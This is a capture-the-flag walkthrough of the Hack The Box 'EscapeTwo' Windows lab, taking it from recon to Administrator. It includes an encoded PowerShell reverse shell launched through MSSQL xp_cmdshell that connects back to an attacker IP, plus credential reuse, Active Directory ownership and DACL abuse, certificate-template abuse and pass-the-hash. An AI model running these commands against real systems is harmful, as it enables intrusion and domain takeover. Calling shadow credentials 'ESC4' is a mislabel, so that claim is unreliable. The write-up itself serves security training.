# EscapeTwo

Difficulty: Easy
OS: Windows
Category: Offensive

![escapeTwo.webp](escapeTwo.webp)

- **NOTE**
    
    No Images ahead because my kali froze, due to *netexec*
    

### Reconnaissance

Using `nmap -sCV 10.10.11.51 -oN escape2-scans`

```bash
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-05-05 01:53:50Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-05T01:55:16+00:00; -20m22s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-05-05T01:55:15+00:00; -20m22s from scanner time.
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
1433/tcp open  ms-sql-s      syn-ack ttl 127 Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2025-05-05T01:55:16+00:00; -20m22s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-05-04T23:26:09
| Not valid after:  2055-05-04T23:26:09
| MD5:   280a:21cd:5aec:ba9b:21b7:5b80:3fef:c0fa
| SHA-1: 6001:073d:ac7b:071d:4450:db52:afea:90cc:9c73:f1c2
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
| ms-sql-ntlm-info: 
|   10.10.11.51:1433: 
|     Target_Name: SEQUEL
|     NetBIOS_Domain_Name: SEQUEL
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: DC01.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.11.51:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
|_ssl-date: 2025-05-05T01:55:16+00:00; -20m22s from scanner time.
3269/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.sequel.htb
| Issuer: commonName=sequel-DC01-CA/domainComponent=sequel
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-08T17:35:00
| Not valid after:  2025-06-08T17:35:00
| MD5:   09fd:3df4:9f58:da05:410d:e89e:7442:b6ff
| SHA-1: c3ac:8bfd:6132:ed77:2975:7f5e:6990:1ced:528e:aac5
| -----BEGIN CERTIFICATE-----
<SNIP>
|_-----END CERTIFICATE-----
|_ssl-date: 2025-05-05T01:55:15+00:00; -20m22s from scanner time.
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 62012/tcp): CLEAN (Timeout)
|   Check 2 (port 61433/tcp): CLEAN (Timeout)
|   Check 3 (port 20179/udp): CLEAN (Timeout)
|   Check 4 (port 19694/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: -20m22s, deviation: 0s, median: -20m22s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-05-05T01:54:38
|_  start_date: N/A
```

Looking at the scan results, there’s DC named `DC01.sequel.htb` so let’s add this in out `/etc/hosts` 

```bash
10.10.11.51     sequel.htb DC01.sequel.htb
```

### SMB Enumeration

You can use various tools to enumerate the shares of the host such as: `smbmap` `smbclient` `crackmapexec` & `netexec` 

```bash
nxc smb 10.10.11.51 -u rose -p KxEPkKe6R8su --shares

# This is a pre-given credential, check on the HTB
```

Access the share *Accounting Department*

```bash
smbclient '//10.10.11.51/Accounting Department' -U rose%KxEPkKe6R8su
```

Then download the two files you see using `get` 

> **.xlsx** files can be treated as a ZIP archive file. Inside there are multiple folders and files that stores data, formatting and settings.
> 

Unzipping `accounts.xlsx` gives us `sharedStrings.xml` which contains a lot of credentials. You can use online “**XML Pretty Print**” to get a pretty view of the xml file.

Save these credentials on 2 separate files for *user* and *password*

```bash
 angela	0fwz7Q4mSpurIt99
 oscar	86LxLBMgEWaKUnBG
 kevin	Md9Wlq1E5bZnVDVo
 sa	MSSQLP@ssw0rd!
```

Enumerate for any valid credentials

```bash
nxc smb 10.10.11.51 -u user -p pass
```

You will find a valid credential for *oscar*

### Establish Foothold

The credentials for *sa* is valid because it’s an MsSQL credential.

```bash
impacket-mssqlclient sequel.htb/sa:'MSSQLP@ssw0rd!'@10.10.11.51
```

> **SA** or System Administrator account is a built-in superuser account in MSSQL with full administrative privileges and should be disabled if not needed.
> 

Enable **xp_cmdshell** to exploit

```bash
SQL (sa  dbo@master)> EXEC sp_configure 'show advanced options', 1;
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> RECONFIGURE;

SQL (sa  dbo@master)> EXEC sp_configure 'xp_cmdshell', 1;
INFO(DC01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (sa  dbo@master)> RECONFIGURE;
```

Generate a shell  from [RevShell Generator](https://www.revshells.com/). You can use anything for a shell, but I use Powershell Base64

```bash
SQL (sa  dbo@master)> EXEC xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAzADYAIgAsADEAMwAzADcAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA'
```

This will establish a foothold for the user `sql_svc`

At directory `C:\` there’s a folder named `SQL2019` read the file `sql-configuration.INI` and you’ll get the following:

```bash
[OPTIONS]
SQLCOLLATION="SQL_Latin1_General_CP1_CI_AS"
SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SQLSYSADMINACCOUNTS="SEQUEL\Administrator"
SECURITYMODE="SQL"
SAPWD="MSSQLP@ssw0rd!"
ADDCURRENTUSERASSQLADMIN="False"
```

Let’s enumerate again for valid users. Before doing this, look at the possible users at `C:\Users` and add `sql_svc` and/or `ryan` to your users

```bash
nxc smb 10.10.11.51 -u users -p 'WqSZAF6CysDQbGb3'
```

This will match on a user named `ryan`

Get the user flag at `Desktop` directory by establishing an `evil-winrm` 

```bash
evil-winrm -i 10.10.11.51 -u ryan -p 'WqSZAF6CysDQbGb3'
```

### Privilege Escalation

Run `bloodhound-python` to map the Active Directory. Use `faketime` or `ntpdate` to adjust the *clockskew* to avoid errors

```bash
bloodhound-python -u 'ryan' -p 'WqSZAF6CysDQbGb3' -d sequel.htb -dc DC01.sequel.htb -ns 10.10.11.51 -c All --zip
```

With the extracted data, look on every nodes, you can view all users with `@sequel.htb` 

The most noteworthy here is from `ryan@sequel.htb` it has `WriteOwner` permission on Certificate Authority user (ca_svc). This means that Ryan can modify or take ownership of the ca_svc account. We could potentially exploit this and privilege escalate. Refer to this for more info in abusing `WriteOwner` permissions: [https://zflemingg1.gitbook.io/undergrad-tutorials/active-directory-acl-abuse/writeowner-exploit](https://zflemingg1.gitbook.io/undergrad-tutorials/active-directory-acl-abuse/writeowner-exploit)

### Grant Ownership

Firstly, I will change the ownership of ca_svc accoutnt to ryan. This set the ryan as the owner of ca_svc object and has full control over it.

```bash
impacket-owneredit -action write -new-owner ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3
```

Then Grant Rights with DACL (Discretionary Access Control List) controls who can do what to an object in Active Directory. By giving FullControl to ryan we can use it to privilege escalate.

```bash
impacket-dacledit -action write -rights FullControl -principal ryan -target ca_svc sequel.htb/ryan:WqSZAF6CysDQbGb3
```

### Shadow Credentials Attack (ESC4)

> **ESC4** abuses the Key Credentials property of Active Directory accounts, allowing an attacker to authenticate as another user using a certificate-based authentication bypass.
> 

This attack will add malicious Key Credential to ca_svc and allows ryan to authenticate as ca_svc using certificate instead of a password.

**NOTE: Always Keep an eye for clock skew errors**

```bash
certipy-ad shadow auto -u 'ryan@sequel.htb' -p 'WqSZAF6CysDQbGb3' -account ca_svc -dc-ip 10.10.11.51
```

Find a vulnerable certificate template using

```bash
certipy-ad find -u 'ca_svc@sequel.htb' -hashes :3b181b914e7a9d5508ea1e20bc2b7fce -stdout -vulnerable
```

Now, using the template we request a certificate as administrator

```bash
certipy-ad req -username 'ca_svc@sequel.htb' -hashes 3b181b914e7a9d5508ea1e20bc2b7fce -ca sequel-DC01-CA -target DC01.sequel.htb -template DunderMifflinAuthentication -upn administrator@sequel.htb

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 50
[*] Got certificate with UPN 'Administrator@sequel.htb'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

Now we get the hash for administrator

```bash
certipy-ad auth -pfx administrator.pfx
```

Then use *evil-winrm* to get the **root** flag

```bash
evil-winrm -i 10.10.11.51 -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
```

Root flag is at `Desktop`